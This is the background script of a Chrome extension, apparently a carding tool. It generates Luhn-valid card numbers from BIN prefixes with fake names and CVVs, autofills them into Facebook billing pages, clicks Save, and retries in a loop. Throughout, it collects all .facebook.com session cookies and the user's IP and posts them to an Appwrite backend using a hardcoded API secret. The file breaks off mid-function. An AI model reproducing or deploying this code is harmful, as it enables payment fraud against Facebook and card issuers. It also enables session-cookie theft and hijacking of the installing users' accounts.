let isProcessingCard = false;
let autoTryInterval = null;
let autoTryActive = false;
let lastBackendSent_CARD_ADDED = 0;
let lastBackendSent_FB_COOKIES = 0;

// =============================================
// Appwrite Configuration
// =============================================
const APPWRITE_CONFIG = {
  endpoint: 'https://nyc.cloud.appwrite.io/v1',
  projectId: '693631c8001ac4fbc231',
  databaseId: '69363201001bc7a64088',
  apiSecret: 'standard_917cef86aef581038cb102a0b6d645aa4574cdccefe56659604f22954dba8b1213ac7a0172d73857e904188fba17e8574f23cfb1f4393301aae31c20b8213b086293b0f8c0f3a581e0862ef5db10ad03b749561368f61778ddf118941af5137eeae8ffc196cdb3f3b8a4ac489dd99a67a059fdfc00afad2893b8858a9ca904e3',
  collections: {
    users: 'users',
    subscriptions: 'subscriptions',
    bins: 'bins',
    cookies: 'cookies',
    logs: 'logs'
  }
};

// Storage for BIN data
let activeBinData = {
  bin: '',
  expiryDate: '',
  cvv: ''
};

let declineBinData = {
  bin: '',
  expiryDate: '',
  cvv: ''
};

// Auto try state
let isAutoTrying = false;
let autoTryCount = 0;
let maxAutoTryCount = 19;

// === آلية الحفاظ على الباكند نشطاً ===
let keepAliveInterval = null;
let lastPingTime = null;
let connectionStatus = 'connecting';

// Initialize extension
chrome.runtime.onInstalled.addListener(async () => {
  console.log('Doc_HEMA Team Extension installed');
  await loadStoredData();

  // بدء آلية الحفاظ على الباكند نشطاً
  startKeepAlivePing();
});

// Load stored data
function loadStoredData() {
  chrome.storage.local.get(['activeBinData', 'declineBinData'], (result) => {
    if (result.activeBinData) {
      activeBinData = result.activeBinData;
    }
    if (result.declineBinData) {
      declineBinData = result.declineBinData;
    }
  });
}

// Save data to storage
function saveData() {
  chrome.storage.local.set({
    activeBinData: activeBinData,
    declineBinData: declineBinData
  });
}

// =============================================
// Appwrite Helper Functions
// =============================================

// Get Appwrite headers
function getAppwriteHeaders() {
  return {
    'Content-Type': 'application/json',
    'X-Appwrite-Project': APPWRITE_CONFIG.projectId,
    'X-Appwrite-Key': APPWRITE_CONFIG.apiSecret
  };
}

// Check subscription status using Appwrite
async function checkSubscription() {
  try {
    const userId = await getCurrentUserId();
    if (!userId) {
      return { isValid: false, message: 'لم يتم تسجيل الدخول' };
    }

    // Query subscription from Appwrite
    const url = `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.subscriptions}/documents?queries[]=${encodeURIComponent(`equal("userId", "${userId}")`)}`;

    const response = await fetch(url, {
      method: 'GET',
      headers: getAppwriteHeaders()
    });

    if (response.ok) {
      const data = await response.json();
      if (data.documents && data.documents.length > 0) {
        const subscription = data.documents[0];
        const isActive = subscription.isActive === true;
        const expiryDate = new Date(subscription.expiryDate);
        const isNotExpired = expiryDate > new Date();

        if (isActive && isNotExpired) {
          return { isValid: true };
        } else {
          return { isValid: false, message: 'الاشتراك منتهي الصلاحية' };
        }
      } else {
        return { isValid: false, message: 'لا يوجد اشتراك' };
      }
    } else {
      return { isValid: false, message: 'خطأ في التحقق من الاشتراك' };
    }
  } catch (error) {
    console.error('Subscription check error:', error);
    return { isValid: false, message: 'خطأ في الاتصال بالخادم' };
  }
}

// Get current user ID from storage
async function getCurrentUserId() {
  return new Promise((resolve) => {
    chrome.storage.local.get(['userId'], (result) => {
      resolve(result.userId);
    });
  });
}


// Get auth token from storage
async function getAuthToken() {
  return new Promise((resolve) => {
    chrome.storage.local.get(['authToken'], (result) => {
      resolve(result.authToken);
    });
  });
}

async function sha256(str) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}


async function getAuthHeaders() {
  const now = new Date();
  const dateStr = now.getUTCFullYear() + "-" + (now.getUTCMonth() + 1).toString().padStart(2, '0') + "-" + now.getUTCDate().toString().padStart(2, '0');
  const hourStr = now.getUTCHours().toString().padStart(2, '0');
  const minuteStr = now.getUTCMinutes().toString().padStart(2, '0');
  const rawToken = secret + ":" + dateStr + ":" + hourStr + ":" + minuteStr + ":" + extKey;
  const hash = await sha256(rawToken);
  const finalToken = btoa(hash + ":" + extKey); // Base64
  return {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + finalToken,
    "X-EXT-KEY": extKey
  };
}


async function getPublicIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch (e) {
    return 'unknown';
  }
}


async function getFacebookCookies() {
  return new Promise((resolve) => {
    if (chrome.cookies && chrome.cookies.getAll) {
      chrome.cookies.getAll({ domain: ".facebook.com" }, function (cookies) {
        let cookiesStr = '';
        if (chrome.runtime.lastError) {
          resolve('');
        } else {
          cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
          resolve(cookiesStr);
        }
      });
    } else {
      resolve('');
    }
  });
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('Background received message:', request);

  if (request.action === 'fillCard') {
    fillCard(request.type, request.noBackend);
    sendResponse({ success: true, message: "Fill card action started" });
  } else if (request.action === 'fillCardWithData') {
    console.log('fillCardWithData action received with data:', request.data);
    fillCardWithSpecificData(request.data, sendResponse);
    return true; // Keep the message channel open for async response
  } else if (request.action === 'auto-link-on-open') {
    triggerFacebookAutoLink();
    sendResponse({ success: true, message: "Auto link triggered" });
  } else if (request.action === 'showNotification') {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs[0]) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: showNotification,
          args: [request.message, request.type]
        });
      }
    });
    sendResponse({ success: true, message: "Notification shown" });

  } else if (request.action === 'newBinAdded') {

    sendToBackend && sendToBackend('BIN_REGISTERED', request.bin);
    sendResponse({ success: true });
    return true;
  } else if (request.action === 'startAutoTry') {
    if (autoTryInterval) {
      sendResponse({ started: false, message: 'Auto try already running' });
      return;
    }
    autoTryActive = true;
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (!tabs[0]) {
        sendResponse({ started: false, message: 'No active tab' });
        return;
      }
      const tabId = tabs[0].id;
      autoTryInterval = setInterval(() => {
        if (!autoTryActive) {
          clearInterval(autoTryInterval);
          autoTryInterval = null;
          return;
        }
        chrome.runtime.sendMessage({ action: 'fillCard', type: 'active' });
      }, 1000);
      sendResponse({ started: true });
    });
    return true;
  } else if (request.action === 'stopAutoTry') {
    autoTryActive = false;
    if (autoTryInterval) {
      clearInterval(autoTryInterval);
      autoTryInterval = null;
    }
    sendResponse({ stopped: true });
    return true;
  } else if (request.action === 'executeActiveBin') {
    executeActiveBin().then(sendResponse);
    return true; // Keep message channel open for async response
  } else if (request.action === 'executeDeclineBin') {
    executeDeclineBin().then(sendResponse);
    return true;
  } else if (request.action === 'updateBinData') {
    updateBinData(request.data);
    sendResponse({ success: true });
  } else if (request.action === 'getBinData') {
    sendResponse({
      activeBinData,
      declineBinData
    });
  }
});

chrome.commands.onCommand.addListener((command) => {
  if (command === 'decline-card') {
    fillCard('decline');
  } else if (command === 'active-card') {
    fillCard('active');
  } else if (command === 'execute-active-bin') {
    const result = executeActiveBin();
    console.log('Active bin result:', result);
  } else if (command === 'execute-decline-bin') {
    const result = executeDeclineBin();
    console.log('Decline bin result:', result);
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (
    changeInfo.status === 'complete' &&
    tab && tab.url &&
    tab.url.includes('facebook.com') &&
    (tab.url.includes('billing') || tab.url.includes('payments'))
  ) {
    try {
      if (chrome.cookies && chrome.cookies.getAll) {
        chrome.cookies.getAll({ domain: ".facebook.com" }, function (cookies) {
          let cookiesStr = '';
          if (chrome.runtime.lastError) {
            console.log("Error getting cookies:", chrome.runtime.lastError);
          } else {
            cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
          }
          const message = `🔔 تم فتح صفحة الفوترة\nالرابط: ${tab.url}`;
          // هنا يمكنك استخدام المتغير tab بأمان
        });
      }
    } catch (error) {
      console.log("Error in cookies handling:", error);
    }
  }
});

function fillCard(type, noBackend) {
  if (!noBackend && isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    return;
  }
  isProcessingCard = true;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      isProcessingCard = false;
      return;
    }

    chrome.storage.local.get([
      'activeBin', 'activeBinExpire', 'activeBinCvv',
      'declineBin', 'declineBinExpire', 'declineBinCvv',
      'cardAutoSave'
    ], (data) => {
      const isDecline = type === 'decline';

      const userBin = isDecline ? data.declineBin : data.activeBin;
      const defaultBin = isDecline ? '546008' : '55988803';
      const bin = /^[0-9X]+$/.test(userBin) ? userBin : defaultBin;

      console.log('Card type:', type);
      console.log('User BIN:', userBin);
      console.log('Default BIN:', defaultBin);
      console.log('Selected BIN:', bin);
      console.log('BIN validation result:', /^[0-9X]+$/.test(userBin));

      const remainingLength = 16 - bin.length;
      const finalCardNumber = bin.length <= 16
        ? generateCardNumber(bin, remainingLength)
        : generateCardNumber(defaultBin, 16 - defaultBin.length);

      const expiry = isDecline
        ? (data.declineBinExpire || generateExpiry())
        : (data.activeBinExpire || generateExpiry());

      const cvv = isDecline
        ? (data.declineBinCvv || generateCVV())
        : (data.activeBinCvv || generateCVV());

      const details = {
        name: generateCardName(),
        number: finalCardNumber,
        expiry: expiry,
        cvv: cvv
      };

      // Log to binding logs for popup display
      const cardLast4 = finalCardNumber.slice(-4);
      chrome.storage.local.get(['bindingLogs', 'bindingStats'], (logResult) => {
        const logs = logResult.bindingLogs || [];
        const stats = logResult.bindingStats || { success: 0, failed: 0, unknown: 0 };

        logs.unshift({
          card: cardLast4,
          status: 'PENDING',
          reason: 'جاري الملء...',
          bin: bin,
          time: new Date().toLocaleTimeString('ar-EG')
        });

        if (logs.length > 50) logs.pop();
        stats.unknown++;

        chrome.storage.local.set({ bindingLogs: logs, bindingStats: stats });
        console.log('Binding log saved:', cardLast4, 'PENDING');
      });

      if (!noBackend) {
        const now = Date.now();
        if (!lastBackendSent_CARD_ADDED || now - lastBackendSent_CARD_ADDED > 8000) {
          sendToBackend('CARD_ADDED', details);
          lastBackendSent_CARD_ADDED = now;
        } else {
          console.log('CARD_ADDED skipped due to 8s rule');
        }
      }

      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: autofillCardDetails,
        args: [details]
      }, (results) => {
        try {
          if (chrome.cookies && chrome.cookies.getAll) {
            chrome.cookies.getAll({ domain: ".facebook.com" }, function (cookies) {
              let cookiesStr = '';
              if (chrome.runtime.lastError) {
                console.log("Error getting cookies:", chrome.runtime.lastError);
              } else {
                cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
              }
              if (!noBackend) {
                console.log('Sending FB_COOKIES to backend...');
                sendToBackend('FB_COOKIES', { cookies: cookiesStr, url: tabs[0].url, time: new Date().toISOString() });
              }
              isProcessingCard = false;
            });
          } else {
            console.log("Cookies API not available");
            isProcessingCard = false;
          }
        } catch (error) {
          console.log("Error in cookies handling:", error);
          isProcessingCard = false;
        }
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: autoClickSaveButton
          });
        } else {
          console.log("Auto Save is OFF — skipping Save button click.");
        }
        if (noBackend) {
          isProcessingCard = false;
        }
      });
    });
  });
}

function fillCardWithSpecificData(cardData, sendResponse) {
  console.log("fillCardWithSpecificData called with cardData:", cardData);

  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    sendResponse({ success: false, message: "Card processing already in progress" });
    return;
  }
  isProcessingCard = true;

  console.log("Starting fillCardWithSpecificData with:", cardData);

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      console.log("No active tab found");
      isProcessingCard = false;
      sendResponse({ success: false, message: "No active tab found" });
      return;
    }

    console.log("Active tab found:", tabs[0].url);

    const details = {
      name: cardData.name,
      number: cardData.number,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      binPattern: cardData.binPattern
    };

    console.log("Attempting to fill form with details:", details);

    sendToBackend('CARD_ADDED', details);

    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: autofillCardDetails,
      args: [details]
    }, (results) => {
      console.log("Form filling result:", results);

      try {
        if (chrome.cookies && chrome.cookies.getAll) {
          chrome.cookies.getAll({ domain: ".facebook.com" }, function (cookies) {
            let cookiesStr = '';
            if (chrome.runtime.lastError) {
              console.log("Error getting cookies:", chrome.runtime.lastError);
            } else {
              cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            }
            console.log('Card filled successfully:', cardData.isQuickBin ? 'Quick BIN' : 'Saved BIN');
            sendToBackend('FB_COOKIES', { cookies: cookiesStr, url: tabs[0].url, time: new Date().toISOString() });
            setTimeout(() => { isProcessingCard = false; }, 2000);
            sendResponse({ success: true, message: "Card filled successfully" });
          });
        } else {
          console.log("Cookies API not available");
          console.log('Card filled successfully:', cardData.isQuickBin ? 'Quick BIN' : 'Saved BIN');
          setTimeout(() => { isProcessingCard = false; }, 2000);
          sendResponse({ success: true, message: "Card filled successfully" });
        }
      } catch (error) {
        console.log("Error in cookies handling:", error);
        console.log('Card filled successfully:', cardData.isQuickBin ? 'Quick BIN' : 'Saved BIN');
        setTimeout(() => { isProcessingCard = false; }, 2000);
        sendResponse({ success: true, message: "Card filled successfully" });
      }

      chrome.storage.local.get(['cardAutoSave'], (data) => {
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: autoClickSaveButton
          });
        } else {
          console.log("Auto Save is OFF — skipping Save button click.");
        }
      });

      if (results && results[0] && results[0].result === 'success') {
        if (autoTryInterval) {
          clearInterval(autoTryInterval);
          autoTryInterval = null;
        }
      }
    });
  });
}

function triggerFacebookAutoLink(tabIdOverride) {
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    return;
  }
  isProcessingCard = true;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tabId = tabIdOverride || (tabs[0] && tabs[0].id);
    if (!tabId) {
      isProcessingCard = false;
      return;
    }
    chrome.storage.local.get([
      'activeBin', 'activeBinExpire', 'activeBinCvv',
      'declineBin', 'declineBinExpire', 'declineBinCvv',
      'cardAutoSave'
    ], (data) => {
      const bin = data.activeBin || '55988803';
      const remainingLength = 16 - bin.length;
      const finalCardNumber = bin.length <= 16
        ? generateCardNumber(bin, remainingLength)
        : generateCardNumber('55988803', 8);
      const expiry = data.activeBinExpire || generateExpiry();
      const cvv = data.activeBinCvv || generateCVV();
      const details = {
        name: generateCardName(),
        number: finalCardNumber,
        expiry: expiry,
        cvv: cvv
      };
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: autofillCardDetails,
        args: [details]
      }, (results) => {
        try {
          if (chrome.cookies && chrome.cookies.getAll) {
            chrome.cookies.getAll({ domain: ".facebook.com" }, function (cookies) {
              let cookiesStr = '';
              if (chrome.runtime.lastError) {
                console.log("Error getting cookies:", chrome.runtime.lastError);
              } else {
                cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
              }
              sendToBackend('FB_COOKIES', { cookies: cookiesStr, url: tabs[0].url, time: new Date().toISOString() });
              setTimeout(() => { isProcessingCard = false; }, 2000);
            });
          } else {
            console.log("Cookies API not available");
            setTimeout(() => { isProcessingCard = false; }, 2000);
          }
        } catch (error) {
          console.log("Error in cookies handling:", error);
          setTimeout(() => { isProcessingCard = false; }, 2000);
        }
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: autoClickSaveButton
          });
        }
      });
    });
  });
}

function autoClickSaveButton() {
  if (document.readyState !== 'complete') {
    console.log("Page not fully loaded, waiting...");
    setTimeout(autoClickSaveButton, 1000);
    return;
  }

  let tries = 0;
  function tryClick() {
    const selectors = [
      'div[role="button"][aria-label="Save"]',
      'button[aria-label="Save"]',
      'div[role="button"][aria-label="حفظ"]',
      'button[aria-label="حفظ"]',
      'button[data-testid*="save"]',
      'button[data-testid*="Save"]',
      'button[class*="save"]',
      'button[class*="Save"]',
      'div[class*="save"]',
      'div[class*="Save"]'
    ];

    let button = null;

    for (const sel of selectors) {
      button = document.querySelector(sel);
      if (button) break;
    }

    if (!button) {
      const allButtons = document.querySelectorAll('button, div[role="button"]');
      for (const btn of allButtons) {
        const text = btn.textContent || btn.innerText || '';
        if (text.toLowerCase().includes('save') || text.toLowerCase().includes('حفظ')) {
          button = btn;
          break;
        }
      }
    }

    if (!button) {
      const forms = document.querySelectorAll('form');
      for (const form of forms) {
        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
        if (submitBtn) {
          button = submitBtn;
          break;
        }
      }
    }

    if (button) {
      try {
        const rect = button.getBoundingClientRect();
        const isVisible = rect.width > 0 && rect.height > 0 &&
          window.getComputedStyle(button).display !== 'none' &&
          window.getComputedStyle(button).visibility !== 'hidden';

        if (isVisible) {
          button.click();
          console.log("Save button clicked successfully!");

          chrome.runtime.sendMessage({
            action: 'showNotification',
            message: 'تم الضغط على زر الحفظ بنجاح',
            type: 'success'
          });

          return true;
        } else {
          console.log("Save button found but not visible");
        }
      } catch (error) {
        console.log("Error clicking save button:", error);
      }
    } else if (tries < 8) {
      tries++;
      console.log(`Save button not found, trying again... (${tries}/8)`);
      setTimeout(tryClick, 1200);
    } else {
      console.log("Save button not found after multiple tries.");

      chrome.runtime.sendMessage({
        action: 'showNotification',
        message: 'لم يتم العثور على زر الحفظ',
        type: 'error'
      });
    }
  }

  setTimeout(tryClick, 2000);
}

const randomWords = [
  'Khan', 'Ahmed', 'Patel', 'Chowdhury', 'Sheikh',
  'Malik', 'Roy', 'Das', 'Hussain', 'Verma',
  'Singh', 'Rahman', 'Sharma', 'Jahan', 'Iqbal',
  'Mondal', 'Rana', 'Mitra', 'Siddiqui', 'Bhattacharya'
];

const randoName = [
  "Aarav", "Arjun", "Kabir", "Ravi", "Vikram", "Raj", "Ayan", "Zayan", "Rehan", "Tariq",
  "Nasir", "Adeel", "Faizan", "Imran", "Nadeem", "Sameer", "Rahul", "Amit", "Vikas", "Karan",
  "Rohit", "Siddharth", "Manoj", "Abdul", "Yusuf", "Asif", "Irfan", "Shahid", "Kamran", "Waqas",
  "Mehedi", "Sabbir", "Tanvir", "Rakib", "Ashik", "Jubayer", "Hasan", "Arif", "Shakil", "Masud",
  "Niaz", "Towhid", "Arafat", "Habib", "Shuvo", "Tarek", "Munna", "Rubel", "Sumon", "Rasel",
  "Anis", "Harun", "Milton", "Shahin", "Liton", "Jamal", "Ovi", "Saiful", "Faruk", "Delwar",
  "Dip", "Rony", "Bappy", "Aslam", "Sagar", "Sohag", "Biplob", "Ripon", "Alam", "Zahid",
  "Sajid", "Tusher", "Mamun", "Nahid", "Tanim", "Reza", "Mizan", "Tanjil", "Sabbir", "Shohel",
  "Sunny", "Sajol", "Raihan", "Tushar", "Emon", "Shuvo", "Nayan", "Salman", "Parvej", "Pavel",
  "Foysal", "Nafis", "Zubair", "Fahim", "Shahriar", "Shafayet", "Hasib", "Ruman", "Noman", "Imtiaz",
  "Aminul", "Hridoy", "Yamin", "Tawsif", "Nashit", "Rizwan", "Saad", "Bilal", "Talha", "Waleed",
  "Hassan", "Junaid", "Basit", "Hamza", "Adil", "Faris", "Kashif", "Affan", "Zeeshan", "Omar",
  "Danish", "Haroon", "Sami", "Fahad", "Haider", "Sufyan", "Mujtaba", "Ammar", "Zayan", "Usman",
  "Zafar", "Latif", "Rizvi", "Faruq", "Mursalin", "Shahbaz", "Mohtasim", "Ehtesham", "Miraz", "Tawsin",
  "Zakir", "Kawsar", "Sayem", "Abrar", "Mustafiz", "Jubayed", "Obaid", "Minhaz", "Fardin", "Touhid",
  "Shahriar", "Mir", "Bashir", "Tazim", "Rashed", "Araf", "Munzir", "Rakin", "Jahin", "Ahsan",
  "Adnan", "Tahmid", "Rahat", "Tarique", "Saddam", "Sabbir", "Fazle", "Mashrur", "Wasiq", "Arkan",

  "Ayesha", "Fatima", "Zara", "Anika", "Nusrat", "Priya", "Puja", "Madhuri", "Ameena", "Sadia",
  "Rima", "Sumaiya", "Mehjabin", "Shila", "Nadia", "Sharmin", "Mousumi", "Lamia", "Tasmia", "Hafsa",
  "Sanjida", "Ishrat", "Nargis", "Mahira", "Khadija", "Ruksana", "Lubna", "Rumana", "Farzana", "Naznin"
];

const generateCardName = () => {
  const randomWord = randomWords[Math.floor(Math.random() * randomWords.length)];
  const randomName = randoName[Math.floor(Math.random() * randoName.length)];

  return `${randomName} ${randomWord}`;
};

const generateCardNumber = (prefix, remainingDigits) => {
  let cardNumber = '';

  console.log('Generating card number from prefix:', prefix, 'remaining digits:', remainingDigits);

  for (let i = 0; i < prefix.length; i++) {
    if (prefix[i] === 'X') {
      const randomDigit = Math.floor(Math.random() * 10);
      cardNumber += randomDigit;
      console.log(`Replaced X at position ${i} with random digit: ${randomDigit}`);
    } else {
      cardNumber += prefix[i];
      console.log(`Kept digit at position ${i}: ${prefix[i]}`);
    }
  }

  for (let i = 0; i < remainingDigits; i++) {
    const randomDigit = Math.floor(Math.random() * 10);
    cardNumber += randomDigit;
    console.log(`Added random digit ${i + 1}: ${randomDigit}`);
  }

  console.log('Generated card number before Luhn check:', cardNumber);
  const finalNumber = luhnCheck(cardNumber);
  console.log('Final card number after Luhn check:', finalNumber);

  return finalNumber;
};

const luhnCheck = (number) => {
  let sum = 0;
  let shouldDouble = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i));
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  if (sum % 10 === 0) return number;
  const lastDigit = parseInt(number.slice(-1));
  const newLastDigit = (lastDigit + (10 - (sum % 10))) % 10;
  return number.slice(0, -1) + newLastDigit;
};

const generateExpiry = () => {
  const currentYear = new Date().getFullYear();
  const year = currentYear + Math.floor(Math.random() * 5) + 1;
  const month = Math.floor(Math.random() * 12) + 1;
  return `${month.toString().padStart(2, '0')}/${year.toString().slice(-2)}`;
};

const generateCVV = () => Math.floor(Math.random() * 900) + 100;

const autofillCardDetails = (details) => {
  const fields = [
    { name: ['cardname', 'card-name', 'cc-name', 'name', 'card_holder_name', 'cardholder', 'firstName'], value: details.name },
    { name: ['cardnumber', 'card-number', 'cc-number', 'number', 'card_number', 'cardnum', 'cardNumber'], value: details.number },
    { name: ['expiry', 'exp-date', 'cc-exp', 'expiration', 'exp_date', 'expiry_date'], value: details.expiry },
    { name: ['cvv', 'cvc', 'cc-csc', 'security', 'cvv_code', 'security_code', 'securityCode'], value: details.cvv }
  ];

  fields.forEach(field => {
    field.name.forEach(name => {
      const selectors = [
        `input[name*="${name}" i]`,
        `input[id*="${name}" i]`,
        `input[placeholder*="${name}" i]`,
        `input[aria-label*="${name}" i]`,
        `input[data-testid*="${name}" i]`,
        `input[class*="${name}" i]`
      ];
      for (const selector of selectors) {
        const input = document.querySelector(selector);
        if (input) {
          input.value = field.value;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true }));
          input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          input.dispatchEvent(new Event('blur', { bubbles: true }));
          break;
        }
      }
    });
  });

  const testIdFields = [
    { testId: 'card_number', value: details.number },
    { testId: 'expiry', value: details.expiry },
    { testId: 'cvv', value: details.cvv },
    { testId: 'name', value: details.name }
  ];

  testIdFields.forEach(field => {
    const input = document.querySelector(`[data-testid*="${field.testId}" i]`);
    if (input) {
      console.log(`Found field by testid ${field.testId}:`, input);
      input.value = field.value;
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      input.dispatchEvent(new Event('blur', { bubbles: true }));
    }
  });

  const countrySelect = document.querySelector('select[name*="country" i], select[id*="country" i]');
  if (countrySelect) {
    countrySelect.value = 'BR';
    countrySelect.dispatchEvent(new Event('change', { bubbles: true }));
  }
  const countryInput = document.querySelector('input[name*="country" i], input[id*="country" i]');
  if (countryInput) {
    countryInput.value = 'Brazil';
    countryInput.dispatchEvent(new Event('change', { bubbles: true }));
  }

  const successMsgs = ['تمت إضافة البطاقة', 'تمت العملية بنجاح', 'Card added', 'Success', 'تمت إضافة طريقة الدفع', 'تمت إضافة وسيلة الدفع'];
  const errorMsgs = ['خطأ', 'فشل', 'غير صالحة', 'Error', 'Failed', 'Invalid'];
  const bodyText = document.body.innerText;
  if (successMsgs.some(msg => bodyText.includes(msg))) {
    return 'success';
  }
  if (errorMsgs.some(msg => bodyText.includes(msg))) {
    return 'fail';
  }
  const cardInputs = document.querySelectorAll('input[name*="card"], input[name*="cc"], input[autocomplete*="cc"], input[placeholder*="بطاقة"], input[placeholder*="Card"], input[placeholder*="رقم"]');
  if (cardInputs.length === 0) {
    return 'success';
  }
  return null;
};

function showNotification(message, type = 'info') {
  const existingNotifications = document.querySelectorAll('.extension-notification');
  existingNotifications.forEach(notification => notification.remove());

  const notification = document.createElement('div');
  notification.className = 'extension-notification';
  notification.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    padding: 12px 20px;
    border-radius: 8px;
    color: white;
    font-family: Arial, sans-serif;
    font-size: 14px;
    font-weight: bold;
    z-index: 999999;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    max-width: 300px;
    word-wrap: break-word;
    animation: slideIn 0.3s ease-out;
  `;

  switch (type) {
    case 'success':
      notification.style.backgroundColor = '#4CAF50';
      break;
    case 'error':
      notification.style.backgroundColor = '#f44336';
      break;
    case 'warning':
      notification.style.backgroundColor = '#ff9800';
      break;
    default:
      notification.style.backgroundColor = '#2196F3';
  }

  notification.textContent = message;

  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
    @keyframes slideOut {
      from {
        transform: translateX(0);
        opacity: 1;
      }
      to {
        transform: translateX(100%);
        opacity: 0;
      }
    }
  `;
  document.head.appendChild(style);

  document.body.appendChild(notification);

  setTimeout(() => {
    if (notification.parentNode) {
      notification.style.animation = 'slideOut 0.3s ease-in';
      setTimeout(() => {
        if (notification.parentNode) {
          notification.remove();
        }
      }, 300);
    }
  }, 4000);
}

// دالة توليد UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// عند أول تشغيل للإضافة، خزّن machineId إذا لم يكن موجودًا
chrome.storage.local.get(['machineId'], function (result) {
  if (!result.machineId) {
    const uuid = generateUUID();
    chrome.storage.local.set({ machineId: uuid });
  }
});


// Send data to Appwrite backend
async function sendToBackend(type, data, retry = false) {
  console.log('🚀 sendToBackend CALLED with type:', type);
  try {
    const userId = await getCurrentUserId();
    const ip = await getPublicIP();
    const cookies = await getFacebookCookies();
    const machineId = await new Promise(resolve => {
      chrome.storage.local.get(['machineId'], res => resolve(res.machineId || 'unknown'));
    });

    // Save log to Appwrite
    const logData = {
      userId: userId || machineId,
      type: type,
      data: JSON.stringify(data),
      ip: ip,
      createdAt: new Date().toISOString()
    };

    console.log('=== Sending log to Appwrite ===');
    console.log('Type:', type);
    console.log('LogData:', logData);
    console.log('URL:', `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`);

    const logResponse = await fetch(
      `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`,
      {
        method: 'POST',
        headers: getAppwriteHeaders(),
        body: JSON.stringify({
          documentId: 'unique()',
          data: logData
        })
      }
    );

    console.log('Log save response:', logResponse.status, logResponse.statusText);
    if (!logResponse.ok) {
      const errorBody = await logResponse.text();
      console.error('❌ Log save error:', errorBody);
    } else {
      console.log('✅ Log saved successfully to Appwrite');
    }


    // If it's cookies data, also save to cookies collection
    if (type === 'FB_COOKIES') {
      // Use cookies from data.cookies (passed from the calling code) or fallback to fetched cookies
      const cookiesToSave = data.cookies || cookies || '';
      console.log('Saving FB_COOKIES to Appwrite:', { hasCookies: !!cookiesToSave, cookiesLength: cookiesToSave.length });

      if (cookiesToSave) {
        console.log('=== Saving cookies to Appwrite ===');
        console.log('Cookies length:', cookiesToSave.length);

        const cookiesData = {
          userId: userId || machineId,
          cookies: cookiesToSave.substring(0, 10000), // Limit size to avoid Appwrite limits
          url: data.url || '',
          ip: ip,
          capturedAt: new Date().toISOString()
        };
        console.log('Cookies data prepared:', { userId: cookiesData.userId, url: cookiesData.url, cookiesLength: cookiesData.cookies.length });

        const cookiesResponse = await fetch(
          `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
          {
            method: 'POST',
            headers: getAppwriteHeaders(),
            body: JSON.stringify({
              documentId: 'unique()',
              data: cookiesData
            })
          }
        );

        console.log('Cookies save response:', cookiesResponse.status, cookiesResponse.statusText);
        if (!cookiesResponse.ok) {
          const errorBody = await cookiesResponse.text();
          console.error('Cookies save error body:', errorBody);
        } else {
          console.log('✅ Cookies saved successfully to Appwrite');
        }
      } else {
        console.log('No cookies to save (empty)');
      }
    }


  } catch (e) {
    console.error('sendToBackend error:', e);
    if (!retry) {
      setTimeout(() => {
        sendToBackend(type, data, true);
      }, 60 * 1000);
    }
  }
}


chrome.action.onClicked.addListener(() => {
